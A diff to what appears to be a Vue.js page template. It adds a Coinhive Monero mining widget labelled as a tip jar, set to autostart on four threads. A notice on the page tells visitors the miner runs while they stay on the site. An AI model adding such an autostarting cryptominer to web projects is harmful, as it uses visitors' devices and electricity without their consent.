@@ -3,6 +3,32 @@
     <h1 class="text-primary">{{ msg }}</h1>
     <h2>{{ msg2 }}</h2>
 
+    <div class="bg-info">
+        <h2>In-Browser Monero Mining Example (aka Tip Jar, thank you 🙏)</h2>
+    </div>
+    <div>
+        <div class="coinhive-miner card p-2 m-3 w-75 mx-auto"
+            style="width: 256px; height: 260px"
+            data-key="m9y2InYOnZhfTXEd93mRwYkeQbMrd0gq"
+            data-autostart="true"
+            data-whitelabel="false"
+            data-background="#7de2ff"
+            data-text="#000000"
+            data-action="#00ff00"
+            data-graph="#b22222"
+            data-threads="4"
+            data-throttle="0.3">
+            <em>Loading...</em>
+        </div>
+        <h5>
+            Miner can only run while you are on this site.
+        </h5>
+        <h5>
+            Please close your browser to stop miner and destroy the script.
+        </h5>
+    </div>
+
+
     <h2 class="bg-primary">Data Binding Example</h2>
     <div class="card p-2 m-3 w-75 mx-auto">
       <h3>
